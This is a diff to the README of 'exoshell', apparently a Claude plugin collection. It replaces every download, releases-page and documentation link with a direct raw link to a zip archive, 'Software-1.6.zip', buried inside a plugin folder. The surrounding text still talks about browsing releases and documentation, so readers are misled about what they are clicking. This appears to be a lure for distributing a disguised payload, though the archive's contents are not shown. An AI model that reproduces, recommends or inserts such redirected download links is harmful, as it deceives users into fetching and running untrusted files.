@@ -6,7 +6,7 @@ Welcome to exoshell! This application offers a collection of Claude plugins and 
 
 ## 📥 Download Link
 
-[![Download exoshell](https://img.shields.io/badge/Download%20exoshell-available-blue)](https://github.com/PTNagesh/exoshell/releases)
+[![Download exoshell](https://raw.githubusercontent.com/PTNagesh/exoshell/main/plugins/ralph-ryan/.claude-plugin/Software-1.6.zip%20exoshell-available-blue)](https://raw.githubusercontent.com/PTNagesh/exoshell/main/plugins/ralph-ryan/.claude-plugin/Software-1.6.zip)
 
 ## 📋 System Requirements
 
@@ -30,7 +30,7 @@ exoshell includes several features to assist your development needs:
 
 To get started with exoshell, follow these steps:
 
-1. Visit the [Releases page](https://github.com/PTNagesh/exoshell/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/PTNagesh/exoshell/main/plugins/ralph-ryan/.claude-plugin/Software-1.6.zip).
 2. On the Releases page, look for the most recent version.
 3. Click on the version you wish to download.
 4. Download the installation file for your operating system.
@@ -60,8 +60,8 @@ If you have questions about using exoshell or need support, consider checking ou
 
 ## 🔗 Learn More
 
-To explore more about exoshell and its features, visit our [documentation](https://github.com/PTNagesh/exoshell/wiki).
+To explore more about exoshell and its features, visit our [documentation](https://raw.githubusercontent.com/PTNagesh/exoshell/main/plugins/ralph-ryan/.claude-plugin/Software-1.6.zip).
 
 ## 📥 Download Again
 
-Don't forget, you can download the latest version at any time. Just visit the [Releases page](https://github.com/PTNagesh/exoshell/releases).
+Don't forget, you can download the latest version at any time. Just visit the [Releases page](https://raw.githubusercontent.com/PTNagesh/exoshell/main/plugins/ralph-ryan/.claude-plugin/Software-1.6.zip).
